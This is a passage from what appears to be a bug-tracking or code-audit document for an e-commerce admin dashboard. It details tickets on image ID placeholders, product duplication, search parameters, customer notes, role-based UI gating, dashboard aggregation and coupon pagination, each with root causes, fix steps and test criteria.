`productImageInputSchema` requires `imagekitFileId: z.string().trim().min(1, "ImageKit file ID is required.")` and `url: z.string().trim().min(1)` — the URL is not even validated as a URL.
`product.service.ts:35-42` `safeDeleteImageKitFile` swallows the failure with a `console.warn`.

**Root Cause:**
The schema made `imagekitFileId` mandatory to guarantee deletability, and the client satisfied it with a placeholder instead of modelling "externally hosted image" as a first-class case.

**Real-World Failure Scenario:**
An admin adds a supplier's product photo by URL, saves, later removes it. `deleteFile("img-3-m9x2")` returns 404; the warning is logged and ignored; the ImageKit object was never there. Meanwhile a real report of "which files can we purge" is impossible because the column is unreliable, and an attempted bulk cleanup could try to delete hundreds of fake IDs.

**Required Implementation:**

1. Make the column nullable in the model: `product_images.imagekit_file_id text NULL` (migration DB-009), and relax `productImageInputSchema` to `imagekitFileId: z.string().trim().regex(/^[a-zA-Z0-9_-]+$/).max(128).optional().nullable()`.
2. Tighten `url`: `z.string().trim().url()` **plus** an allowlist of `ik.imagekit.io` or `https:` with an explicit note. If external images are a supported workflow, keep `https:` only and document the trade-off (no purge, no CDN transform).
3. Update `ProductForm.tsx` to send `imagekitFileId: img.fileId ?? null` (no fabrication).
4. Update `safeDeleteImageKitFile` to no-op on `null` (it already does: `if (!fileId) return;`).
5. Update `toProductBundleDTO` / `toProductListItemDTO` to tolerate `null` file IDs (they already use optional chaining in most places — verify).
6. Record in `docs/ai-context/IMAGEKIT_CONTEXT.md`: the media pipeline manages only images with a non-null `imagekit_file_id`; everything else is an external reference.

**Expected Behavior After Fix:**
No fabricated identifiers are stored. URL-only images persist with `imagekit_file_id = NULL` and are never sent to ImageKit for deletion. Real uploads keep their real IDs. A future cleanup job can distinguish the two.

**Dependencies:**
- **Depends on** DB-009 (nullable column).
- **Related** BUG-017, SEC-009, ECOM-008.

**Testing Requirements:**
- Add an image by URL → row has `imagekit_file_id IS NULL`, product renders.
- Remove that image and save → no ImageKit call attempted, row deleted.
- Upload an image → real ID stored, purge works.
- Validation: `url: "not a url"` → `VALIDATION_ERROR`.
- Data migration: existing `img-…` placeholders are identified by the Q8 query (§8.2) and nulled (documented, reversible).

**Acceptance Criteria:**
- [ ] Column nullable, Drizzle + SQL in sync.
- [ ] Form sends `null`, never a placeholder.
- [ ] URL validated.
- [ ] Deletion skips null IDs.
- [ ] Existing placeholders cleaned per §8.3.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-022 — `duplicateProduct` drops colours and images

**Priority:** P2
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Products.tsx
src/server/services/product.service.ts
src/actions/products.ts
```

**Problem Description:**
The duplicate action copies name, slug, description, category, brand, gender, material, status, engravability and variants — but never `colors` or `images`. It also sends variants with `colorName` only (BUG-019's contract) and a `name`/`sku` suffix built from `Date.now()`, so a duplicated product always loses its colour matrix and all photography.

**Current Implementation:**
`src/views/Products.tsx:172-206`:
```ts
const res = await createProductAction({
  name: `${product.name} (Copy)`,
  slug: `${product.slug}-copy-${Date.now().toString(36)}`,
  description: product.description || undefined,
  categoryId: product.categoryId || undefined,
  brand: product.brand || undefined,
  gender: (product.gender as any) || "unisex",
  material: product.material || undefined,
  status: "draft",
  isEngravable: product.engraveable,
  isFeatured: false,
  variants: product.variants.map((v, i) => ({ … sku: `${v.sku}-CP-${Date.now().toString(36).slice(-4)}` … })),
});
```
The `product` object comes from `toProductListItemDTO`, which exposes only a **synthetic single variant** and the primary image (`dto.ts:126-168`) — so even if the mapping were extended, the list view does not carry the data.

**Root Cause:**
Duplication was implemented against the *list* DTO rather than the *detail* bundle. The list DTO deliberately omits the matrix for performance (PERF-003), so the duplicate action was doomed to lose data from the start.

**Real-World Failure Scenario:**
An admin duplicates a best-selling 6-colour × 5-size scrub set to create a variant line. The copy has one synthetic variant with the minimum price and no images. The admin must re-enter 30 variants and re-upload photography — worse than creating from scratch, and the synthetic variant has a made-up SKU (`SLUG-SKU`) that may collide.

**Required Implementation:**

1. Change the client to fetch the full bundle before duplicating: `const full = await getProductByIdAction({ id: product.id })`, then call `createProductAction` with `full.colors`, `full.variants` (real `colorId`/`colorName`, real SKUs with a suffix), and `full.images` (real `imagekitFileId`/`url`, colour associations).
2. Be explicit about **asset sharing**: duplicating images must not copy ImageKit files (expensive, and deletion of one product would orphan the other). Reference the *same* `imagekit_file_id` in both products. **This requires the deletion semantics in SEC-009 to check whether an ImageKit file is still referenced by another row** — a shared file deleted by product A's save would break product B. Therefore:
   - Implement a reference check before purge: `SELECT count(*) FROM product_images WHERE imagekit_file_id = $1 AND id <> $2`. If > 0, skip the ImageKit delete.
   - Record this in `docs/ai-context/IMAGEKIT_CONTEXT.md`.
3. Generate the copied slug as `${slug}-copy${n}` where `n` increments until unique, instead of a timestamp (a timestamp guarantees the storefront sees a nonsense URL and defeats slug reuse).
4. Generate SKUs deterministically: `${sku}-C1`, `-C2` … and validate the whole batch for uniqueness before calling.
5. Consider implementing duplication server-side (`productService.duplicateProduct(id, admin)`) inside a single transaction — strongly preferred, because the client-side reconstruction is fragile and not atomic. Do this if effort permits; otherwise the client approach with a single `createProductAction` call is acceptable.

**Expected Behavior After Fix:**
A duplicated product has the same colour matrix, variants (with unique SKUs), and images (shared references) as the source, in `draft` status, with a readable slug.

**Dependencies:**
- **Depends on** BUG-018/BUG-019 (colour round-trip must work), SEC-009 (reference-aware deletion).
- **Related** ECOM-008.

**Testing Requirements:**
- Duplicate a 3-colour, 4-image product → copy has 3 colours, 3×sizes variants, 4 images, unique SKUs, `draft`.
- Delete an image from the copy → source product's image unaffected; ImageKit object still exists.
- Delete the copy → source unaffected.
- Duplicate twice → slugs `-copy1`, `-copy2` (or similarly unique).
- Failure: SKU collision → `CONFLICT` with the offending SKU.

**Acceptance Criteria:**
- [ ] Colours copied.
- [ ] Images copied as shared references.
- [ ] SKUs unique and deterministic.
- [ ] Slug readable and unique.
- [ ] Deletion is reference-aware.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-023 — Global search writes `?q=` but list pages never read it

**Priority:** P2
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/components/layout/topbar.tsx
src/app/products/page.tsx
src/app/orders/page.tsx
src/app/customers/page.tsx
src/views/Products.tsx
src/views/Orders.tsx
src/views/Customers.tsx
```

**Problem Description:**
The topbar search navigates to `/products?q=…`, `/orders?q=…`, `/customers?q=…`. None of those pages accept `searchParams`, and no view reads `useSearchParams` (verified: `grep -rln "useSearchParams" src/views` returns only `Login.tsx`). The query string is silently ignored; the user lands on an unfiltered list.

**Current Implementation:**
`src/components/layout/topbar.tsx:99,156,169,182`:
```ts
router.push(`/products?q=${encodeURIComponent(q)}`);
router.push(`/orders?q=${encodeURIComponent(query.trim())}`);
router.push(`/customers?q=${encodeURIComponent(query.trim())}`);
```
`src/app/products/page.tsx:16`: `export default async function Page()` — no `searchParams` prop. Same for `orders/page.tsx` and `customers/page.tsx`. `Products.tsx` keeps its own local `const [query, setQuery] = useState("")`.

**Root Cause:**
The search box was built for the legacy client-store app where a global store held the query. After the migration to server-loaded props, the URL contract was never wired to the server query.

**Real-World Failure Scenario:**
A staff member pastes an order number into the global search, presses Enter, and sees the full order list. They conclude the order does not exist and ask the customer to re-order.

**Required Implementation:**

1. Accept `searchParams` on all three pages and pass the value through:
   ```ts
   export default async function Page({ searchParams }: { searchParams: Promise<{ q?: string }> }) {
     const { q } = await searchParams;
     … productService.getProducts({ page: 1, limit: 100, q }, admin) …
     return <ProductsPage initialProducts={…} initialQuery={q ?? ""} />;
   }
   ```
   (`searchParams` is a Promise in Next.js 15/16 — the existing `src/app/page.tsx` already does this correctly at line 26.)
2. Server-side filtering is **already implemented** in all three repositories (`product.repository.ts:141-150`, `order.repository.ts:111-124`, `customer.repository.ts:60-70`), so this is purely plumbing.
3. Initialise the view's `query` state from `initialQuery` so the input reflects the URL and the client-side filter stays consistent.
4. Keep the client-side filter as-is for instant narrowing within the loaded page; the server query narrows the fetched set.
5. Sync the input back to the URL with `router.replace` on submit (not on every keystroke) so a reload preserves the search.

**Expected Behavior After Fix:**
`/products?q=teal`, `/orders?q=SX-1001`, `/customers?q=ayesha` return pre-filtered lists and the search box shows the term.

**Dependencies:**
- **Related** PERF-005 (server-side search + pagination), BUG-033 (the 100-row cap).

**Testing Requirements:**
- Each route with `?q=` → only matching rows rendered, count matches.
- Empty `q` → unchanged behaviour.
- `q` with special characters (`%`, `_`) → handled (ILIKE wildcards escaped — see PERF-005 note).
- Reload preserves the term.

**Acceptance Criteria:**
- [x] All three pages read `searchParams`.
- [x] Initial query passed to and rendered by the view.
- [x] Results actually filtered.
- [x] Reload preserves the term.

**Implementation Complexity:** Low

- [x] Completed

---

### BUG-024 — Orders list: missing payment-method filters and a misleading "this month" badge

**Priority:** P2
**Category:** Bug
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Orders.tsx
src/lib/types.ts
src/scripts/seed-database.ts
```

**Problem Description:**
Two small defects.

(a) The payment-method filter offers only `all`, `bank`, `jazzcash`, `easypaisa`, `cod`. `PaymentMethodId` includes `sadapay` and `nayapay`, and the seed creates `sadapay`. Orders paid via SadaPay cannot be filtered, and `dto.toOrderDTO` maps the raw code (`bank_transfer` stays `bank_transfer`, not `bank`), so the `bank` option can also fail to match.

(b) The header badge reads `PKR {orders.filter(o => o.status === "delivered").length} delivered this month` — it counts *all* delivered orders in the loaded page, not this month's.

**Current Implementation:**
`src/views/Orders.tsx:293-296`: five `SelectItem`s. `src/views/Orders.tsx:198`: the badge expression above. `src/lib/types.ts:91-97`: `PaymentMethodId` includes `sadapay` and `nayapay`. `src/scripts/seed-database.ts:88`: `code: "sadapay"`.

**Root Cause:**
The filter list was hard-coded before SadaPay was added to the enum and seed, and the badge label was written before any date logic existed.

**Real-World Failure Scenario:**
Support cannot isolate SadaPay orders during a reconciliation with that wallet provider. The dashboard badge shows "18 delivered this month" in a month with 3 deliveries, undermining trust in every figure on the screen.

**Required Implementation:**

1. Derive the filter options from the seeded/available payment methods rather than hard-coding: pass the fetched `paymentMethods` (the service exists — `paymentMethodService`) into the view, or at minimum add `sadapay` and `nayapay`.
2. Normalise the DTO: map `bank_transfer → bank` in `toOrderDTO` (the payments DTO already does this at `dto.ts:461`) so the filter value matches. **Note:** this touches BUG-029's DTO block; coordinate.
3. Replace the badge with a computed value from real data:
   - Either a server-side count (`orders where status='delivered' and delivered_at >= date_trunc('month', now())`), passed as a prop, or
   - Relabel to "delivered (loaded)" if a truthful count is not available in this issue.
   Prefer the server count; it is one cheap aggregate and belongs with the dashboard work (PERF-002).
4. Do not change the visual design; only the value and, if needed, the label.

**Expected Behavior After Fix:**
Every seeded payment method can be filtered and matches real orders. The badge reports the true count for the current month.

**Dependencies:**
- **Related** BUG-029 (DTO normalisation), PERF-002 (dashboard aggregates).

**Testing Requirements:**
- Fixture: one order per method → each filter returns exactly its order.
- `bank_transfer` order appears under "Bank Transfer".
- Badge count equals `SELECT count(*) … delivered_at >= date_trunc('month', now())`.
- Month rollover: an order delivered last month is excluded.

**Acceptance Criteria:**
- [x] SadaPay and NayaPay filterable.
- [x] `bank_transfer` normalised to `bank`.
- [x] Badge reflects a real month-scoped count.
- [x] No layout change.

**Implementation Complexity:** Low

- [x] Completed

---

### BUG-025 — Customer notes are corrupted by a `\n---\n` delimiter round-trip

**Priority:** P2
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/CustomerDetail.tsx
src/lib/dto.ts
src/db/schema/customers.ts
src/server/validation/customers.ts
```

**Problem Description:**
Customer notes are stored as a **single text column** (`customers.notes`) but presented in the UI as a list of timestamped notes. Adding a note concatenates `existing + "\n---\n" + new`, and the DTO splits the column back into a list. Any note that itself contains `\n---\n` (a horizontal rule typed by a user, or a pasted separator) is destroyed; notes also lose their author and timestamp because none are stored — `toCustomerDTO` fabricates `id: "note-root"` and `at` from `updatedAt`.

**Current Implementation:**
`src/views/CustomerDetail.tsx:78-84`:
```ts
const existingNotes = customer.notes.map((n) => n.text).join("\n---\n");
const updatedNotes = existingNotes ? `${existingNotes}\n---\n${note.trim()}` : note.trim();
await updateCustomerAction({ id: customer.id, notes: updatedNotes });
```
`src/lib/dto.ts:196-206`:
```ts
const notesList = typeof c.notes === "string" && c.notes.trim()
  ? [{ id: "note-root", text: c.notes, at: serializeDate(c.updatedAt || c.createdAt) }]
  : [];
```
Note the DTO does **not** split on the delimiter — so after the first append, the whole blob renders as one note containing literal `---` lines. The list UI (`CustomerDetail.tsx:211`) iterates `customer.notes` with `item.at`, so every note shows the same timestamp.

**Root Cause:**
A list-shaped domain concept (append-only staff notes with author and time) was stored in a scalar column with an ad-hoc separator, without a parser on the read path.

**Real-World Failure Scenario:**
Two staff members add notes about a hospital account: "Prefers petite sizing" and "Needs logo on left chest". The second append produces one blob with `---`. The UI shows a single note dated today containing both, attributed to no one. Later a third note with a typed `---` splits the history at the wrong place. Nothing is recoverable because the original boundaries are ambiguous.

**Required Implementation:**

1. **Short term (this issue):** create a proper `customer_notes` table (migration DB-011): `id uuid pk`, `customer_id uuid not null references customers(id) on delete cascade`, `body text not null`, `created_by text references ba_user(id) on delete set null`, `created_at timestamptz not null default now()`; index on `(customer_id, created_at desc)`.
2. Migrate existing data: split existing `customers.notes` on the delimiter **once**, in SQL, preserving order and stamping `created_at = customers.updated_at` for all rows (documented as best-effort). Keep the original column for one release (do not drop) and set it to `NULL` after a verified copy — reversible.
3. Add `customerNoteRepository` / extend `customer.service` with `addNote`, `listNotes`, `deleteNote` (delete = `super_admin` only, soft-delete not required).
4. Add `addCustomerNoteAction` with `body: z.string().trim().min(1).max(2000)` and `requiredRole: "admin"` (align to the matrix).
5. Update `toCustomerDTO` to map real rows (id, body→text, createdAt→at, author name).
6. Update `CustomerDetail.tsx` to call the action instead of rewriting the whole field.
7. If time is constrained, the **minimum acceptable** fix is to make the DTO split on the delimiter and render each part, plus forbid `---` in the input. That is a stopgap, not the fix; record it explicitly rather than pretending the issue is closed.

**Expected Behavior After Fix:**
Notes are discrete rows with author and timestamp. Adding a note never mutates existing notes. `---` inside a note is just text. Deleting a customer cascades their notes.

**Dependencies:**
- **Related** DB-011, ECOM-004 (customer notes are a P2 feature that this issue partially delivers).

**Testing Requirements:**
- Add three notes → three rows, three distinct timestamps, correct authors.
- Note containing `---` → stored and rendered intact.
- Migration: a legacy blob with three segments → three rows in order.
- Delete a customer → notes cascade.
- Regression: customer detail renders with zero notes (empty state).

**Acceptance Criteria:**
- [x] `customer_notes` table exists with FK + index.
- [x] Legacy notes migrated once, verifiably.
- [x] Add/list/delete actions implemented with validation.
- [x] DTO maps real rows.
- [x] No delimiter logic remains in the UI.

**Implementation Complexity:** Medium

- [x] Completed

---

### BUG-026 — No UI authorization gating (staff sees admin-only controls)

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/layout.tsx
src/components/layout/app-shell.tsx
src/components/layout/sidebar.tsx
src/views/Products.tsx
src/views/OrderDetail.tsx
src/views/Payments.tsx
src/views/ProductForm.tsx
src/views/Settings.tsx
```

**Problem Description:**
Every page is server-authorized, but the client never receives the current role, so all mutating controls render for everyone. A `staff` user sees "Add product", "Approve payment", "Refund", "Archive", "Settings" and the delete affordances. Clicking them produces a `FORBIDDEN` toast — correct security, poor UX, and it advertises capabilities the user does not have.

**Current Implementation:**
`grep -rn "role ===\|admin.role\|isAdmin" src/views/*.tsx src/components/layout/*.tsx` returns **nothing**. `src/app/layout.tsx:56` computes `const admin = await getCurrentAdmin()` and uses it only for the sidebar counts; the role is never passed down. `AppShell` accepts `layoutStats` and `notifications` only (`app-shell.tsx:19-24`).

**Root Cause:**
RBAC was implemented exclusively server-side (correctly, per Safety Rule 6) and the UI layer was never given the role, so it renders a superset of what the user may do.

**Real-World Failure Scenario:**
A new staff hire spends their first week clicking buttons that fail. They report "the app is broken". More seriously, a staff user who is shown a "Refund" button learns the business permits refunds and may promise one to a customer they cannot deliver.

**Required Implementation:**

1. Pass the resolved role from `src/app/layout.tsx` into `AppShell` as a prop: `role={admin?.role ?? null}`. `getCurrentAdmin` already returns `role` (`AdminRole`).
2. Create `src/lib/permissions.ts` (pure, isomorphic):
   ```ts
   export const CAPABILITIES = {
     "product:write": ["admin", "super_admin"],
     "order:status":  ["admin", "super_admin"],
     "order:ship":    ["admin", "super_admin"],
     "payment:verify":["admin", "super_admin"],
     "settings:write":["super_admin"],
     "customer:write":["admin", "super_admin"],
     "inventory:adjust":["admin", "super_admin"],
   } as const;
   export function can(role: string | null | undefined, capability: keyof typeof CAPABILITIES): boolean {
     return !!role && (CAPABILITIES[capability] as readonly string[]).includes(role);
   }
   ```
   This table must mirror the **server** matrix in §6.1.1 exactly — add a test that asserts parity (TEST-003).
3. Provide the role to views via a React context created in `AppShell` (`RoleProvider`) so leaf components can call `can(role, …)` without prop-drilling through 18 views.
4. Hide (not merely disable) mutating controls the role cannot use. Keep the existing design; no new styles.
5. **Never** rely on this for security — every action already re-checks. Add a comment at the top of `permissions.ts` stating that it is cosmetic and the server is authoritative.
6. Special case: `SEC-013` hides the Settings nav item for non-`super_admin`; implement it through `can()` so there is one rule.

**Expected Behavior After Fix:**
A `staff` user sees read-only screens with no mutating buttons. `admin` sees everything except Settings. `super_admin` sees everything. Server authorization is unchanged.

**Dependencies:**
- **Depends on** SEC-004 (role must be trustworthy), SEC-013 (capability matrix), ARCH-001.
- **Blocks** nothing; improves UX for all later phases.

**Testing Requirements:**
- Render each page as staff/admin/super_admin; assert the visible control set matches §6.1.1.
- Assert a hidden control is also rejected by the server (defence in depth).
- Parity test: every `CAPABILITIES` entry matches the corresponding `requiredRole`.
- No layout regression at 1280px and 768px.

**Acceptance Criteria:**
- [x] Role reaches the client through one provider.
- [x] `can()` used for all mutating controls listed above.
- [x] Visibility matrix matches the server matrix (tested).
- [x] Server checks unchanged.
- [x] No visual redesign.

**Implementation Complexity:** Medium

- [x] Completed

---

### BUG-027 — Dashboard "previous period" change is hardcoded to `0`

**Priority:** P2
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/page.tsx
src/views/Dashboard.tsx
```

**Problem Description:**
The server passes `previousPeriodChange: 0` unconditionally. The view recomputes a real value client-side from the loaded orders (`Dashboard.tsx:112-126`) and mostly ignores the prop — but for any consumer that reads `initialMetrics.previousPeriodChange` (and for the initial render before the memo runs), the value is a lie. The server-side metric block also omits any previous-period aggregate.

**Current Implementation:**
`src/app/page.tsx:105-115`:
```ts
initialMetrics = {
  …,
  previousPeriodChange: 0,
};
```
`src/views/Dashboard.tsx:112-126` computes `previousPeriod` from `billable` (the loaded 100 orders) — which is itself wrong for 90d/12m ranges (BUG-028).

**Root Cause:**
The metric was stubbed during the RSC migration and the client-side computation was left in place, so the stub is invisible in casual testing but present in the contract.

**Real-World Failure Scenario:**
A manager reads "0% vs previous 30 days" on first paint, then the number jumps to "+12%" a moment later. If the client list is truncated (BUG-028), even the settled number is wrong, and two people looking at the same dashboard at different times see different growth figures.

**Required Implementation:**

1. Compute both periods server-side in one query:
   ```sql
   SELECT
     COALESCE(SUM(total) FILTER (WHERE placed_at >= now() - interval '30 days'), 0) AS current_total,
     COALESCE(SUM(total) FILTER (WHERE placed_at >= now() - interval '60 days'
                            AND placed_at <  now() - interval '30 days'), 0) AS previous_total
   FROM orders WHERE status NOT IN ('cancelled','refunded');
   ```
   Make the interval a parameter derived from `period` (`7d|30d|90d|12m`) so the server and client agree.
2. Return `currentTotal`, `previousTotal`, `change` and pass them as props.
3. Remove the client-side recomputation from `Dashboard.tsx` (or keep it only as a fallback when the props are absent, clearly commented).
4. Timezone: all period boundaries must use `Asia/Karachi` (see PERF-001/DB-014), not the database's UTC `now()`. Use `now() AT TIME ZONE 'Asia/Karachi'` for day bucketing.
5. Keep the existing card layout and copy; only the value source changes.

**Expected Behavior After Fix:**
The dashboard shows a real period-over-period change that matches a SQL query for the same window, on first paint and after hydration, for all four periods.

**Dependencies:**
- **Depends on** BUG-028 (chart/aggregate correctness) — same query block.
- **Related** PERF-001, PERF-002.

**Testing Requirements:**
- Fixture with known totals in two windows → displayed change equals `(cur-prev)/prev*100`.
- Zero previous period → shows the defined 100%/0% rule consistently on server and client.
- All four periods produce different, correct values.
- First paint equals settled state (no jump).

**Acceptance Criteria:**
- [ ] Server computes both windows.
- [ ] `previousPeriodChange` is real.
- [ ] Client no longer recomputes from a truncated list.
- [ ] Karachi timezone used.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-028 — Dashboard charts aggregate a truncated order set

**Priority:** P1
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/page.tsx
src/views/Dashboard.tsx
```

**Problem Description:**
The dashboard fetches at most 100 orders (`limit: 100`) and computes every chart, KPI delta and status breakdown in the browser from that array (`billable`, `chartData`, `previousPeriod`, `statusBreakdown`). For `90d` and `12m` periods the data is capped at 100 rows, so revenue, order counts and growth are understated — arbitrarily, depending on ordering. The server's `orderMetrics` (which is authoritative) is used for only four fields.

**Current Implementation:**
`src/app/page.tsx:44-52` requests `{ page: 1, limit: 100, sortBy: "placedAt", sortOrder: "desc" }`. `src/views/Dashboard.tsx:113-188` builds `previousPeriod`, `chartData` (7d/30d daily, 90d weekly, 12m monthly) and `statusBreakdown` purely from `billable`. The page also ignores `period` for the server query — it is only used to initialise the client toggle.

**Root Cause:**
The charts were written when the view owned a mock dataset (100 rows was the whole dataset). After migration to live data, the aggregation stayed client-side.

**Real-World Failure Scenario:**
The store has 900 orders in the last 12 months. The dashboard shows revenue for roughly the last 100 orders (a few weeks) spread across 12 monthly buckets — most buckets empty, "this month" understated, and the growth percentage computed from a sample that is not the period. Management makes purchasing decisions from it.

**Required Implementation:**

1. Add a server-side aggregate that returns bucket data for the requested period, one query per granularity:
   ```sql
   SELECT date_trunc($1, placed_at AT TIME ZONE 'Asia/Karachi') AS bucket,
          COUNT(*) AS orders,
          COALESCE(SUM(total), 0) AS revenue
   FROM orders
   WHERE status NOT IN ('cancelled','refunded')
     AND placed_at >= now() - $2::interval
   GROUP BY 1 ORDER BY 1;
   ```
   `$1 ∈ {day, week, month}`, `$2` derived from `period` (7d/30d → day, 90d → week, 12m → month).
2. Zero-fill missing buckets **on the server** so the chart shape is deterministic and the client has no date math.
3. Add a status-breakdown aggregate (`GROUP BY status`).
4. Pass `{ buckets, statusBreakdown, metrics }` as props; delete the client-side `useMemo` aggregations.
5. Keep the existing chart components and styling untouched (Safety Rule 3) — only feed them different data.
6. Remove the `limit: 100` order fetch from this page entirely; the dashboard should not download order rows to draw aggregates. If a "recent orders" list is required by the design, fetch it separately with `limit: 5` and label it "Recent".
7. Coordinate with PERF-002 (query count) and BUG-027 (previous period).

**Expected Behavior After Fix:**
Every dashboard figure equals the corresponding SQL aggregate for the selected period, regardless of order volume, and the page transfers a fixed, small payload.

**Dependencies:**
- **Depends on** nothing; supersedes the client-aggregation approach.
- **Related** PERF-001, PERF-002, BUG-027, DB-014.

**Testing Requirements:**
- Fixture: 250 orders spread over 12 months → 12m buckets sum to the SQL total.
- 90d weekly buckets align to Karachi weeks.
- 7d daily buckets include today (partial day handled explicitly).
- Status breakdown matches `GROUP BY status`.
- Payload size independent of order count.

**Acceptance Criteria:**
- [ ] Server aggregates for all four periods.
- [ ] Buckets zero-filled server-side.
- [ ] Client performs no aggregation.
- [ ] Totals match SQL.
- [ ] Dashboard no longer fetches 100 order rows.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-029 — DTO fidelity: fabricated customer type, timeline author, images, engravings

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/lib/dto.ts
src/views/OrderDetail.tsx
src/views/Customers.tsx
```

**Problem Description:**
`src/lib/dto.ts` invents values where data is missing, so the UI cannot distinguish "unknown" from "true".

| Line | Fabrication | Consequence |
|---|---|---|
| 289 | `by: "Admin"` for every status-history entry | Audit trail looks complete but is not; the real `changed_by` is ignored |
| 320 | `customerType: "registered"` always | Guest customers are labelled registered |
| 252-258 | Only `item.engravings?.[0]` mapped | Multi-engraving items lose all but the first |
| 262 | `image: item.imageUrl \|\| "/products/scrubs-teal.jpg"` | Every item without a snapshot shows a teal scrub photo |
| 241 | `customerEmail = "customer@example.com"` default | Fake email rendered as if real |
| 378 | `orderNumber = "SX-1001"` default param | Fake order number in payment cards |
| 461 | `code === "bank_transfer" ? "bank" : code` | Correct here — contrast with the order DTO (BUG-024) |

**Current Implementation:**
All references verified at the cited lines of `src/lib/dto.ts`. `orderStatusHistory.changed_by` is a `text` column that stores either a `ba_user.id` or the literal `"system"` (`order.repository.ts:469`: `changedBy: "system"`), and `findById` returns the history rows unfiltered.

**Root Cause:**
The DTO layer was built to satisfy the view model's non-nullable types during the mock-data migration. Rather than widening the types, defaults were invented, and they were never revisited once real data arrived.

**Real-World Failure Scenario:**
An auditor opens an order timeline and sees five status changes all "by Admin". They cannot tell whether the system or a person confirmed the order — exactly the question an audit is meant to answer. A customer service agent quotes a guest customer's "registered email" that does not exist.

**Required Implementation:**

1. Widen the view types to represent absence honestly:
   - `Order.timeline[].by?: string` (null → render "System"),
   - `Customer.type: "registered" | "guest" | "unknown"` — derive from `customers.user_id` (`isRegistered` already exists in `CustomerListItem`),
   - `orderItem.image?: string` (no fallback; render a neutral placeholder in the UI, not a product photo),
   - `customer.email?: string`.
2. Resolve the timeline author properly: join `order_status_history.changed_by` to `ba_user.name` in `findById` (one `LEFT JOIN`, no extra query), and map `"system"` to `null` so the UI can label it.
3. Map **all** engravings: change `engraving` (singular) to `engravings: OrderItemEngraving[]` in the view type and render each. If the UI is not ready for multiple, keep the first for display but **expose the full array** so no data is silently dropped.
4. Remove default parameters that fabricate business identifiers (`orderNumber`, `customerName`, `customerEmail`); require them or render "—".
5. Keep the `bank_transfer → bank` normalisation and apply it to the order DTO as well (BUG-024).

**Expected Behavior After Fix:**
Every displayed value either comes from the database or renders an explicit unknown/empty state. An audit reader can distinguish system actions from human actions.

**Dependencies:**
- **Related** BUG-016 (list DTO split), BUG-024, BUG-030.

**Testing Requirements:**
- System-generated transition → timeline shows "System".
- Human transition → shows the user's name.
- Guest customer → type "guest".
- Item without a snapshot image → placeholder, and no request for `scrubs-teal.jpg`.
- Item with two engravings → both present in the payload.
- Type check passes with the widened types (no `as any` added).

**Acceptance Criteria:**
- [ ] No fabricated business values in `dto.ts`.
- [ ] Timeline author resolved from the DB.
- [ ] Customer type derived from `user_id`.
- [ ] All engravings preserved.
- [ ] Image fallback removed.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-030 — Coupon list loads the entire table into memory and mislabels "scheduled"

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/coupon.repository.ts
src/lib/dto.ts
src/lib/types.ts
src/views/Coupons.tsx
```

**Problem Description:**
Two defects.

(a) `CouponRepository.findPaginated` selects **all** matching coupons with no `LIMIT`, evaluates derived status in JavaScript, filters in memory, then slices for the page. At a few thousand coupons this is a full table read on every list request; the `total` and page contents are computed from an unbounded array.

(b) `toCouponDTO` casts the computed status to `"active" | "inactive" | "expired"`, dropping `"scheduled"` — a status `deriveStatus` genuinely returns (`coupon.repository.ts:35-37`). The view type does not include it either, so a scheduled coupon is rendered with a status the UI does not understand (today it is cast to `expired` visually via the shared badge mapping).

**Current Implementation:**
`src/server/repositories/coupon.repository.ts:47-105`:
```ts
const allRows = await executor.select().from(coupons).where(whereClause).orderBy(orderExpr);
const filteredRows = allRows.map(row => ({ ...row, computedStatus: this.deriveStatus(row, now) }))
  .filter(row => filter.status === "all" ? true : row.computedStatus === filter.status);
const total = filteredRows.length;
const offset = (filter.page - 1) * filter.limit;
const paginatedItems = filteredRows.slice(offset, offset + filter.limit);
```
`src/lib/dto.ts:420`: `status: c.computedStatus as "active" | "inactive" | "expired"`.

**Root Cause:**
Status is derived from `(is_active, starts_at, expires_at, usage_limit, usage_count)` — a time- and counter-dependent expression. Rather than expressing it in SQL (where it can be filtered and paginated), it was computed in JS, which forced full materialisation.

**Real-World Failure Scenario:**
During a campaign the marketing team creates 4,000 single-use codes. Opening `/coupons` transfers and parses all 4,000 rows, then displays 20. The page takes seconds and allocates megabytes per request. Separately, a coupon scheduled to start next week is displayed as "expired", so the team recreates it — producing a duplicate code and a `CONFLICT`.

**Required Implementation:**

1. Express the derived status as a SQL `CASE` and use it for both filtering and a real `COUNT`:
   ```sql
   CASE
     WHEN is_active = false THEN 'inactive'
     WHEN starts_at > now() THEN 'scheduled'
     WHEN expires_at IS NOT NULL AND expires_at <= now() THEN 'expired'
     WHEN usage_limit IS NOT NULL AND usage_count >= usage_limit THEN 'exhausted'
     ELSE 'active'
   END
   ```
   Add `"exhausted"` if `deriveStatus` supports it (verify — current implementation does not; if not, do not invent it, and note the gap).
2. `WHERE` the case expression when `filter.status !== 'all'`, `COUNT(*)` with the same predicate, and `LIMIT/OFFSET` in SQL.
3. Update `CouponStatus` in `src/lib/types.ts` to include `"scheduled"` (and `"exhausted"` only if step 1 adds it), and remove the narrowing cast in `toCouponDTO`.
4. Update `src/views/Coupons.tsx` badge/label maps to render the new status truthfully.
